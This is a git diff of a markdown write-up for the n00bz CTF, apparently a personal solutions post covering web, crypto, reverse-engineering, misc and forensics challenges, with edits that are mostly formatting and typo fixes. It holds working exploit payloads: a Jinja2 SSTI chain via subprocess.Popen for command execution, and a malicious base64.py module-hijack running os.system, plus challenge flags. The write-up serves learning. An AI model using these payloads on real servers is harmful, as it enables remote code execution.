@@ -4,7 +4,9 @@
 
 ![image](https://github.com/user-attachments/assets/4fa8daa1-b9f6-4d60-9a81-3b306c0e40c6)
 
-### Challeges
+--------------------------------
+
+### Challenges
 
 - Web:
   - Passwordless
@@ -27,12 +29,13 @@
 - Forensics:
   -  Plane
   -  Bad Wave
+--------------------------------
    
 ### Web:
 
 ### Challenge: Passwordless
 
-   ![image](https://github.com/user-attachments/assets/83262de2-1574-4005-b0a7-02f9b0e05295)
+![image](https://github.com/user-attachments/assets/83262de2-1574-4005-b0a7-02f9b0e05295)
 
 - Explaining the source code:
 
@@ -69,7 +72,7 @@
       if __name__ == '__main__':
           app.run(host='0.0.0.0', port=1337)
 
-- The `/<uid>` route reveals the flag, one of the requirement for creating the flag's uid is the leet uid which is hardocded  and the majin vulnerability.If the uid is added to the route, it reveals the flag.
+- The `/<uid>` route reveals the flag, one of the requirement for creating the flag's uid is the leet uid which is hardocded  and the main vulnerability.If the uid is added to the route, it reveals the flag.
 
       #Leet uid
       leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
@@ -94,10 +97,12 @@
          ❯ curl http://24.199.110.35:40150/3c68e6cc-15a7-59d4-823c-e7563bbb326c
       n00bz{1337-13371337-1337-133713371337-1337}
 
+--------------------------------
+
 
 ### File Sharing Portal
 
- ![image](https://github.com/user-attachments/assets/620d23c3-b40a-4a43-a1f0-7d7bd4b8b1e1)
+![image](https://github.com/user-attachments/assets/620d23c3-b40a-4a43-a1f0-7d7bd4b8b1e1)
 
 ### Source Code Analysis/
 
@@ -115,7 +120,7 @@
                 tar_file.extractall(path=f'./uploads/{name}/')
                 return render_template_string(f"<p>Tar file extracted! View <a href='/view/{name}'>here</a>")
 
-- The `/view/<name` checks if all the characters are within the range `a-f0-9` and if it appears otherwise, it triggers an error.Then, it uses `os.listdir()` to list the directory of the extracted tar file which is stored in a `list`.Then, it uses this `f'<a href="/read/{name}/{i}">{i}</a>'` line to create an hyperlink to each extracted files. The server uses the function `render_template_string()` to render the html code.Although, the function  is vulnerable to SSTI injection which allows us execute python code on the server. The code executes the name of the extracted file because the server doesn't convert it into a hash.
+- The `/view/<name` checks if all the characters are within the range `a-f0-9` and if it appears otherwise, it triggers an error.Then, it uses `os.listdir()` to list the directory of the extracted tar file which is stored in a `list`.Then, it uses this `f'<a href="/read/{name}/{i}">{i}</a>'` line to create an hyperlink to each extracted files. The server uses the function `render_template_string()` to render the html code.Although, the function  is vulnerable to SSTI injection which allows us execute python code on the server. The code executes the name of the extracted file because the server doesn't convert it into a hash. 
 
 
        if not all([i in "abcdef1234567890" for i in name]):
@@ -130,9 +135,12 @@
            # except:
         return render_template_string(out)
 
-### Proof of concept 
-
+- SSTI or `Server Side Template Injection` allows an attacker to inject code into templates. The web application was created with Flask and SSTI allows an attacker to inject code into `jinja2` templates. The `render_template_string()` function is the main sink which is responsible to executing the injected code.
+  
 - I wrote a python script that stores the payload with  `input()` and creates a file with the payload's name.Then, a tarfile named `zip.tar` is created with module `tarfile` and the payload named file is added to it. This code works in an infinite `while True:` loop to prevent the scripting from exiting.
+
+
+### Proof of Concept
 
 - Code:
       
@@ -158,30 +166,33 @@
 
 - Creating the `tarfile`
 
-  ![image](https://github.com/user-attachments/assets/42725d11-9e19-4c1a-bb82-3220e3a0406c)
+![image](https://github.com/user-attachments/assets/42725d11-9e19-4c1a-bb82-3220e3a0406c)
 
 - Uploading the tar file shows it works, here is the result of `config`, it should be noted that ssti payloads should be enclosed with \{\{\}\}
   
-  ![image](https://github.com/user-attachments/assets/2aeca84b-8d71-4392-a868-e2f5382fef82)
+![image](https://github.com/user-attachments/assets/2aeca84b-8d71-4392-a868-e2f5382fef82)
 
 ### RCE
 
-- I got command execution with this payload `"".__class__.__base__.__subclasses__()[351]`, now we can execute shell commands with `class subprocess.Popen`.
+- I got command injection with this payload `"".__class__.__base__.__subclasses__()[351]`, now we can execute shell commands with `class subprocess.Popen`.
 
-   ![image](https://github.com/user-attachments/assets/889412d1-1e9f-41f9-9f3f-07763f68100f)
+![image](https://github.com/user-attachments/assets/889412d1-1e9f-41f9-9f3f-07763f68100f)
 
 ### Reading the flag
 
 - I read the flag with this payload `"".__class__.__base__.__subclasses__()[351]("cat flag_15b726a24e04cc6413cb15b9d91e548948dac073b85c33f82495b10e9efe2c6e.txt",shell=True,stdout=-1).communicate()`
 
-  ![image](https://github.com/user-attachments/assets/68a287da-fea8-4b00-bd10-3053431c05f1)
+![image](https://github.com/user-attachments/assets/68a287da-fea8-4b00-bd10-3053431c05f1)
 
 - Flag with curl:
 
         ❯ curl http://f94014e3-dcf1-4cf2-8cc3-3a72ec904122.challs.n00bzunit3d.xyz:8080/view/8b5973174657e070c52f6d9aa82d0f3eaeab9ccca427dda8595dfeba0c6d06b0
       <h1>Files</h1><br><a href="/read/8b5973174657e070c52f6d9aa82d0f3eaeab9ccca427dda8595dfeba0c6d06b0/(b&#39;n00bz{n3v3r_7rus71ng_t4r_4g41n!_af872df9316a}\n&#39;, None)">(b&#39;n00bz{n3v3r_7rus71ng_t4r_4g41n!_af872df9316a}\n&#39;, None)</a>% 
+
       
-      
+--------------------------------
+
+
 ### CRYPTO:
 
 ### Vinegar:
@@ -197,6 +208,8 @@
 
 ![image](https://github.com/user-attachments/assets/70ccc674-52a7-4493-8bfa-b00077dd2ffc)
 
+
+--------------------------------
 
 ### RSA
 
@@ -226,7 +239,9 @@
 
         ❯ ./rsa.py
       n00bz{crypt0_1s_1nc0mpl3t3_w1th0ut_rs4!!}
+
   
+--------------------------------
 
 ### Rev:
 
@@ -255,6 +270,8 @@
       n00bz{from_paris_wth_xor}
 
 
+--------------------------------
+
 
 ### Programming
 
@@ -280,7 +297,7 @@
   ![image](https://github.com/user-attachments/assets/0e951039-d857-41f5-a9fe-47af475aae2a)
 
 
-
+--------------------------------
 
 ### Misc:
 
@@ -301,6 +318,8 @@
 - Flag:
 
       n00bz{Terms_0f_Serv1c3s_4nd_pr1v4cy_p0l1cy_6f3a4d}
+
+--------------------------------
 
 ### Waas
 
@@ -343,12 +362,12 @@
 
 ### Vulnerability
 
-- The source code imports the base64 module but it does not apply it in the code, we can simply try to overwrite the base64 module's py script. Instead of trying to find the py script, we can create the base64.py file in the same directoty as the py file because python `open()` function automatically creates a file even if it does not exist, so it does not raise the exception. We will be abusing py policy because python checks the challenge code's directory for the module script before it checks python libraries' directory.
+- The source code imports the base64 module but it does not apply it in the code, we can simply try to overwrite the base64 module's script. Instead of trying to find the py script, we can create the base64.py file in the same directory as the challenge's python file because python `open(,'w')` function automatically creates a file even if it does not exist, so it does not raise the exception. We will be abusing py policy because python checks the challenge code's directory for the module script before it checks python libraries' directory.
 - We will be writing this code to our malicious `base64.py` file.
 
-  Payload: `import os;print(os.system("cat flag.txt"))`
+  Payload-: ```import os;print(os.system("cat flag.txt"))```
   
-- I added `print()` to print the results of `os.system()` as soon as we reconnect the service.The `os.system` function  is used to execute shell commands.
+- Th payload imports the `os` module and calls the `system()` to execute shell command `cat flag.txt`.The shell command outputs the contents of the `flag.txt` file.I added `print()` to print the result of `os.system()`.The service executes the content of our malicious `base64.py` if we reconnect to the service
 
 - Exploiting it
 
@@ -358,6 +377,7 @@
 
        n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_972529c5f5a9}
 
+--------------------------------
   
 ### Forensics:
 
@@ -381,7 +401,7 @@
 
       n00bz{13.37,-13.37}
 
-
+--------------------------------
 
 ### Wave
 
@@ -404,7 +424,15 @@
 
       n00bz{beepbopmorsecode}
 
+--------------------------------
 
+### Teammates' writeup:
+
+- **Bl4ckanon's writeup**: (here)[https://github.com/BlackAnon22/BlackAnon22.github.io/blob/main/posts/CTF Competitions/n00bz_ctf.md]
+
+--------------------------------
+
+Thanks for reading_____________
 
 * * *
 ### REFERENCES:
